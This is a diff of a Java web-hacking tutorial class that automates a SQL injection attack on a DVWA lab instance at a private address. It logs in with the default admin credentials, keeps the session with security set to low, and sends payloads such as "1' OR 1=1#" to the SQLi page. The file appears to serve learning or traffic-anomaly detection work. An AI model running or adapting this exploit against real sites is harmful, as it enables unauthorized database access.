@@ -2,111 +2,135 @@ package TrafficAnomalyDetection.FDS.WebHackingTutorial;
 
 import java.io.*;
 import java.net.*;
-import java.util.List;
-import java.util.Map;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
+import java.nio.charset.StandardCharsets;
+import java.util.*;
+import java.util.regex.*;
 
 public class SQLInjectionTrial {
+    private static final String BASE_URL = "http://192.168.219.103/DVWA";
+    private static final String LOGIN_URL = BASE_URL + "/login.php";
+    private static final String ATTACK_URL = BASE_URL + "/vulnerabilities/sqli/";
+    private static String sessionCookie = null;
+    private static String csrfToken = null;
+    private static HttpURLConnection conn = null;
 
-    public void SQLInjection() throws Exception {
-        String loginUrl = "http://192.168.219.102/DVWA/login.php";
-        String attackUrl = "http://192.168.219.102/DVWA/vulnerabilities/sqli/";
+    public static void main(String[] args) throws Exception {
+        SQLInjectionTrial trial = new SQLInjectionTrial();
+        trial.run();
+    }
 
-        // 1. CSRF 토큰 가져오기
-        String csrfToken = getCSRFToken(loginUrl);
-        if (csrfToken == null) {
-            System.out.println("CSRF 토큰 가져오기 실패! 공격 중단");
-            return;
-        }
-        System.out.println("CSRF 토큰: " + csrfToken);
-
-        // 2. 로그인 후 세션 쿠키 가져오기
-        String credentials = "username=admin&password=password&Login=Login&user_token=" + csrfToken;
-        String sessionCookie = loginAndGetSession(loginUrl, credentials);
-        if (sessionCookie == null) {
+    public void run() throws Exception {
+        // 1️⃣ 로그인 및 세션 유지
+        if (!login()) {
             System.out.println("로그인 실패! 공격 중단");
             return;
         }
-        System.out.println("로그인 성공! 세션 쿠키: " + sessionCookie);
 
-        // 3. SQL Injection 공격 요청 보내기
-        String params = "id=1' OR '1'='1&Submit=Submit";
-        sendAttack(attackUrl, params, sessionCookie);
+        // 2️⃣ SQL Injection 공격 실행
+        String payload = URLEncoder.encode("1' OR 1=1#", StandardCharsets.UTF_8) + "&Submit=Submit#";
+        sendAttack(payload);
     }
 
-    // CSRF 토큰 가져오는 메서드
-    public static String getCSRFToken(String url) throws Exception {
-        URL loginPageUrl = new URL(url);
-        HttpURLConnection conn = (HttpURLConnection) loginPageUrl.openConnection();
-        conn.setRequestMethod("GET");
+ // ✅ 로그인 처리 (세션 유지)
+    private boolean login() throws Exception {
+        // 1️⃣ 로그인 페이지에서 CSRF 토큰 가져오기
+        String loginPage = sendRequest(LOGIN_URL, "GET", null);
+        csrfToken = extractCsrfToken(loginPage);
+        if (csrfToken == null) {
+            System.out.println("CSRF 토큰을 찾을 수 없습니다.");
+            return false;
+        }
 
+        // 2️⃣ 로그인 요청 보내기
+        String loginData = "username=admin&password=password&user_token=" + csrfToken + "&Login=Login";
+        sendRequest(LOGIN_URL, "POST", loginData);
+
+        // 3️⃣ 리디렉션 URL을 확인하여 로그인 성공 여부 판단
+        Map<String, List<String>> headers = conn.getHeaderFields();
+        System.out.println(headers);
+        System.out.println(conn.getHeaderField("Set-Cookie"));
+        
+        String redirectUrl = conn.getHeaderField("Location");
+        if (redirectUrl != null && redirectUrl.contains("/index.php")) {
+            System.out.println("로그인 성공! 리디렉션 확인됨.");
+            return true;
+        }
+        System.out.println("로그인 실패! 리디렉션 없음.");
+        return false;
+    }
+
+    // ✅ SQL Injection 공격 요청
+    private void sendAttack(String payload) throws Exception {
+        String attackUrl = ATTACK_URL + "?id=" + payload;
+        String response = sendRequest(attackUrl, "GET", null);
+        System.out.println("공격 응답:");
+        System.out.println(response);
+    }
+
+    // ✅ 요청을 처리하는 공통 메서드 (GET/POST 지원)
+    private String sendRequest(String urlString, String method, String postData) throws Exception {
+        URL url = new URL(urlString);
+        conn = (HttpURLConnection) url.openConnection();
+        conn.setRequestMethod(method);
+        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
+        conn.setRequestProperty("Accept", "text/html");
+        
+        // 🔥 기존 세션 쿠키 유지 (로그인 후 세션을 유지함)
+        if (sessionCookie != null) {
+            conn.setRequestProperty("Cookie", sessionCookie);
+        }
+        
+     // ✅ 여기에서 로그인 요청 헤더 출력 (login.php 요청일 경우)
+        if (urlString.contains("login.php")) {
+            System.out.println("🔹 [로그인 요청] Request Headers:");
+            conn.getRequestProperties().forEach((key, value) -> System.out.println(key + ": " + value));
+//            conn.getRequestProperties();
+        }
+        
+//        Map<String, List<String>> headers = conn.getHeaderFields();
+//        System.out.println(headers);
+
+        // 🔥 POST 요청 처리
+        if ("POST".equals(method) && postData != null) {
+            conn.setDoOutput(true);
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(postData.getBytes(StandardCharsets.UTF_8));
+            }
+        }
+
+        // 🔥 응답 읽기
         BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-        String inputLine;
         StringBuilder response = new StringBuilder();
+        String inputLine;
         while ((inputLine = in.readLine()) != null) {
             response.append(inputLine);
         }
         in.close();
 
-        // 정규식을 이용해 CSRF 토큰 추출
-        Pattern pattern = Pattern.compile("name='user_token' value='(.*?)'");
-        Matcher matcher = pattern.matcher(response.toString());
-        if (matcher.find()) {
-            return matcher.group(1);
-        }
-        return null;
-    }
+     // 🔥 로그인 후 쿠키 저장 (기존 세션 갱신)
+        if (urlString.contains("login.php")) {
+            Map<String, List<String>> headerFields = conn.getHeaderFields();
+            List<String> cookies = headerFields.get("Set-Cookie");
 
-    // 로그인 후 세션 쿠키 가져오기
-    public static String loginAndGetSession(String loginUrl, String credentials) throws Exception {
-        URL url = new URL(loginUrl);
-        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-        conn.setRequestMethod("POST");
-        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-        conn.setDoOutput(true);
-
-        try (OutputStream os = conn.getOutputStream()) {
-            os.write(credentials.getBytes());
-            os.flush();
-        }
-
-        // 응답 헤더에서 세션 쿠키 추출
-        Map<String, List<String>> headerFields = conn.getHeaderFields();
-        List<String> cookies = headerFields.get("Set-Cookie");
-
-        if (cookies != null) {
-            for (String cookie : cookies) {
-                if (cookie.contains("PHPSESSID")) {
-                    return cookie.split(";")[0] + "; security=low";  // 보안 설정 포함
+            if (cookies != null) {
+                for (String cookie : cookies) {
+                    if (cookie.startsWith("PHPSESSID")) {  // ✅ 새로운 PHPSESSID 저장
+                        String[] parts = cookie.split(";");
+                        sessionCookie = parts[0] + "; security=low";  // ✅ 기존 security=low 유지
+                        System.out.println("새로운 세션 쿠키 저장: " + sessionCookie);
+                        break;
+                    }
                 }
             }
         }
-        return null;
+
+        return response.toString();
     }
 
-    // SQL Injection 공격 요청
-    public static void sendAttack(String targetUrl, String params, String cookie) throws Exception {
-        URL url = new URL(targetUrl);
-        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-        conn.setRequestMethod("POST");
-        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-        conn.setRequestProperty("Cookie", cookie);
-        conn.setDoOutput(true);
-
-        try (OutputStream os = conn.getOutputStream()) {
-            os.write(params.getBytes());
-            os.flush();
-        }
-
-        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-        String inputLine;
-        StringBuilder response = new StringBuilder();
-        while ((inputLine = in.readLine()) != null) {
-            response.append(inputLine);
-        }
-        in.close();
-
-        System.out.println("공격 응답: " + response.toString());
+    // ✅ CSRF 토큰 추출 메서드
+    private String extractCsrfToken(String response) {
+        Pattern pattern = Pattern.compile("name='user_token' value='(.*?)'");
+        Matcher matcher = pattern.matcher(response);
+        return matcher.find() ? matcher.group(1) : null;
     }
 }
